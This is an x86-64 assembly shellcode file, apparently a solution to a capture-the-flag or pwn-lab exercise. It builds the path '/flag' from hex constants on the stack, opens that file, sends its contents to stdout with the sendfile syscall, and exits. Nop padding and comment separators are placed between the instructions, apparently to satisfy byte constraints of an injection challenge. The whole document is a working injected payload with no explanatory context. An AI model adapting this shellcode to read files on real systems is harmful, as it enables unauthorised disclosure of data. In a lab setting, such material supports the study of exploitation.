        .intel_syntax noprefix
        .global _start
        .text

_start:
open:
        // open 
        xor rax, rax
        inc rax
        nop
        nop
//
        inc rax
        nop
        nop
        nop
        nop
        nop
//
        //const char __user * filename
        mov rdx, 0x67616c66
nop
//
        shl rdx, 32
nop
nop
nop
nop
//
        add rdx, 0x2faaaaaa
nop
//
        shr     rdx, 24
        push    rdx
        mov rdi, rsp
//

        // int flags
        xor rsi, rsi
        // umode_t mode
        xor rdx, rdx
        syscall
//

        push rax
        nop
        nop
        nop
        nop
        nop
        nop
        nop
//

sendfile:
        // size_t count
        mov     r10, 123456789
        nop
//
        // loff_t__user * offset
        xor     rdx, rdx
        // int in_fd
        pop     rsi
        // int out_fd
        xor     rdi, rdi
        nop
//
        inc rdi
        mov     al, 40
        syscall
        nop
//

exit:   //exit
        mov     al, 60
        xor     rdi, rdi
        syscall
        nop
